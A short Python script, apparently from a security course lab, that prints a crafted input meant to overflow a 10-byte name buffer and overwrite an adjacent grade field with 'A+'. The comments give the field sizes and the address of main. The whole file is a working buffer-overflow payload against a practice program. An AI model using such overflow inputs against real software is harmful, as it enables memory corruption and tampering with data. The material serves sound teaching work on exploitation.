import sys
# doesn't appear to be happy on ag
sys.stdout.buffer.write(b'iamr'+b'\x00'*6+b'A+\x00')
# name is 10 bytes, grade is 5
# main starsts at 0x08048bf5
# done 